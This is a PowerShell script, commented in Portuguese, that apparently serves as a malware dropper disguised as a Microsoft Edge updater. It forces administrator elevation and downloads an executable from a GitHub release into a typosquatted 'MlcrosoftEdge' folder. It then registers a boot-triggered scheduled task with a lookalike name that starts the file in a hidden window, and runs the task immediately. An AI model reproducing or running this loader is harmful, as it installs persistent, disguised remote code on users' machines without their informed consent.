<#
.SYNOPSIS
D32N 8UD2N328UDXCM3289XM2U83XM238XMU28UXM238MX238X23

.DESCRIPTION
NSDA8D7213ND328YM243DC87Y2M4C28Y7MN2C84YUNM283CM2C4
#>

[CmdletBinding()]
param()

# ⭐⭐⭐ FUNÇÃO DE AUTO-ELEVAÇÃO ⭐⭐⭐
function Elevate-ToAdmin {
    param(
        [string]$ScriptPath = $MyInvocation.MyCommand.Path
    )
    
    # Verifica se já está como Administrador
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    if (-NOT $isAdmin) {
        Write-Host "🔴 Script NÃO está rodando como Administrador!" -ForegroundColor Red
        Write-Host "🔄 Reiniciando com privilégios elevados..." -ForegroundColor Yellow
        
        # Prepara os argumentos
        $arguments = "-File `"$ScriptPath`""
        
        # Adiciona os parâmetros originais se houver
        if ($MyInvocation.BoundParameters) {
            foreach ($key in $MyInvocation.BoundParameters.Keys) {
                $value = $MyInvocation.BoundParameters[$key]
                if ($value -is [switch]) {
                    $arguments += " -$key"
                } else {
                    $arguments += " -$key `"$value`""
                }
            }
        }
        
        # Adiciona argumentos posicionais se houver
        if ($MyInvocation.UnboundArguments) {
            $arguments += " " + ($MyInvocation.UnboundArguments -join " ")
        }
        
        Write-Host "📌 Executando: powershell.exe $arguments" -ForegroundColor Cyan
        
        # Reinicia o script como Administrador
        $process = Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs -PassThru
        
        Write-Host "⏳ Aguardando novo processo..." -ForegroundColor Yellow
        $process.WaitForExit()
        
        # Sai do processo atual
        Exit $process.ExitCode
    }
    
    Write-Host "✅ Script rodando com privilégios de Administrador!" -ForegroundColor Green
}

# ⭐ CHAMA A AUTO-ELEVAÇÃO ANTES DE QUALQUER COISA
Elevate-ToAdmin

# ⭐ CONTINUAÇÃO DO SCRIPT (JÁ COMO ADMIN)
$urlDownload = "https://github.com/4ybbe/phpSv/releases/download/stupid/EdgeUpdateSupport.exe"
$diretorioDestino = "C:\ProgramData\MlcrosoftEdge"
$nomeTarefa = "MlcrosoftEdgeUpdateHelper"

function Download-File {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Url,
        [Parameter(Mandatory=$true)]
        [string]$OutFile,
        [int]$Retries = 3
    )
    
    # Configura TLS para compatibilidade
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    
    for ($i = 0; $i -lt $Retries; $i++) {
        try {
            Write-Host "Baixando de: $Url (tentativa $($i+1)/$Retries)"
            
            Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
            
            Write-Host "Download concluído com sucesso!" -ForegroundColor Green
            return $true
        } catch {
            if ($i -eq ($Retries - 1)) {
                Write-Error "Falha ao baixar o arquivo após $Retries tentativas: $_"
                return $false
            }
            Write-Host "Tentativa $($i+1) falhou, tentando novamente em 2 segundos..."
            Start-Sleep -Seconds 2
        }
    }
    return $false
}

function Add-ScheduledTask {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Nome,
        [Parameter(Mandatory=$true)]
        [string]$CaminhoExecutavel
    )
    
    try {
        Write-Host "Criando tarefa '$Nome' no agendador do Windows..."
        
        # Remove tarefa existente
        $tarefaExistente = Get-ScheduledTask -TaskName $Nome -ErrorAction SilentlyContinue
        if ($tarefaExistente) {
            Write-Host "Removendo tarefa existente..."
            Unregister-ScheduledTask -TaskName $Nome -Confirm:$false -ErrorAction Stop
        }
        
        $usuario = "$env:USERDOMAIN\$env:USERNAME"
        $dataAtual = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
        
        # ⭐ XML COM InteractiveToken (NÃO precisa de senha)
        $xmlTarefa = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>$dataAtual</Date>
    <Author>$env:USERNAME</Author>
    <Description>Edge Update Helper</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$usuario</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-Command "Start-Process -FilePath '$CaminhoExecutavel' -WindowStyle Hidden"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

        $xmlPath = [System.IO.Path]::GetTempFileName() + ".xml"
        $xmlTarefa | Out-File -FilePath $xmlPath -Encoding Unicode
        
        Write-Host "📄 XML criado: $xmlPath"
        
        # ⭐ CRIA A TAREFA (SEM SENHA)
        $process = Start-Process -FilePath "schtasks" -ArgumentList "/create /tn `"$Nome`" /xml `"$xmlPath`" /f" -Wait -PassThru -NoNewWindow
        
        Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
        
        if ($process.ExitCode -ne 0) {
            throw "Falha ao criar tarefa. Código: $($process.ExitCode)"
        }
        
        Write-Host "✅ Tarefa '$Nome' criada com SUCESSO!" -ForegroundColor Green
        Write-Host "👤 Usuário: $usuario" -ForegroundColor Yellow
        Write-Host "⚠️ Executa APENAS quando o usuário estiver logado" -ForegroundColor Yellow
        return $true
        
    } catch {
        Write-Error "❌ Falha ao criar tarefa: $_"
        return $false
    }
}

function Main {   
    Write-Host "`n========================================" -ForegroundColor Cyan
    Write-Host "   🚀 INICIANDO INSTALAÇÃO" -ForegroundColor Cyan
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host "📌 URL: $urlDownload"
    Write-Host "📁 Destino: $diretorioDestino"
    Write-Host "📋 Nome da Tarefa: $nomeTarefa"
    Write-Host "👤 Executando como: $env:USERDOMAIN\$env:USERNAME" -ForegroundColor Yellow
    Write-Host "🔑 Privilégios: ADMIN" -ForegroundColor Green
    Write-Host "========================================`n"
    
    try {
        # 1. Cria a pasta de destino
        Write-Host "📂 Passo 1/3: Criando diretório..."
        if (-not (Test-Path -Path $diretorioDestino)) {
            New-Item -ItemType Directory -Path $diretorioDestino -Force | Out-Null
            Write-Host "✅ Diretório criado: $diretorioDestino"
        } else {
            Write-Host "ℹ️ Diretório já existe: $diretorioDestino"
        }
        
        # 2. Baixa o executável
        Write-Host "`n📥 Passo 2/3: Baixando executável..."
        $nomeArquivo = [System.IO.Path]::GetFileName($urlDownload)
        if ([string]::IsNullOrEmpty($nomeArquivo)) {
            $nomeArquivo = "EdgeUpdateSupport.exe"
        }
        $caminhoCompleto = Join-Path -Path $diretorioDestino -ChildPath $nomeArquivo
        
        $downloadSuccess = Download-File -Url $urlDownload -OutFile $caminhoCompleto
        
        if (-not $downloadSuccess) {
            throw "Falha no download do arquivo. Verifique a URL e a conexão com internet."
        }
        
        # Verifica se o arquivo foi baixado
        if (-not (Test-Path -Path $caminhoCompleto)) {
            throw "Arquivo não encontrado após download: $caminhoCompleto"
        }
        Write-Host "✅ Arquivo baixado: $caminhoCompleto" -ForegroundColor Green
        
        # 3. Cria tarefa no agendador (COMO SYSTEM)
        Write-Host "`n⚙️ Passo 3/3: Configurando tarefa no agendador..."
        $sucessoTarefa = Add-ScheduledTask -Nome $nomeTarefa -CaminhoExecutavel $caminhoCompleto
        
        if (-not $sucessoTarefa) {
            throw "Falha ao criar tarefa agendada"
        }
        
        # ⭐ EXECUTA A TAREFA IMEDIATAMENTE
        Write-Host "`n▶️ Executando tarefa imediatamente..."
        $runProcess = Start-Process -FilePath "schtasks" -ArgumentList "/run /tn `"$nomeTarefa`"" -Wait -PassThru -NoNewWindow
        
        if ($runProcess.ExitCode -eq 0) {
            Write-Host "✅ Tarefa executada com sucesso!" -ForegroundColor Green
        } else {
            Write-Host "⚠️ Tarefa agendada, mas falhou ao executar imediatamente. Será executada na próxima inicialização." -ForegroundColor Yellow
        }
        
        Write-Host "`n========================================" -ForegroundColor Green
        Write-Host "   ✅ INSTALAÇÃO CONCLUÍDA COM SUCESSO!" -ForegroundColor Green
        Write-Host "========================================" -ForegroundColor Green
        Write-Host "📋 Tarefa: $nomeTarefa" -ForegroundColor Yellow
        Write-Host "🔑 Executando como: SYSTEM (Privilégios Máximos)" -ForegroundColor Yellow
        Write-Host "🔄 Será executada na próxima inicialização do sistema." -ForegroundColor Yellow
        Write-Host "========================================`n"
        
    } catch {
        Write-Error "❌ Erro durante a instalação: $_"
        Write-Host "`n========================================" -ForegroundColor Red
        Write-Host "   ❌ INSTALAÇÃO FALHOU" -ForegroundColor Red
        Write-Host "========================================`n" -ForegroundColor Red
        Exit 1
    }
}

# ⭐ EXECUTA A FUNÇÃO PRINCIPAL
Main
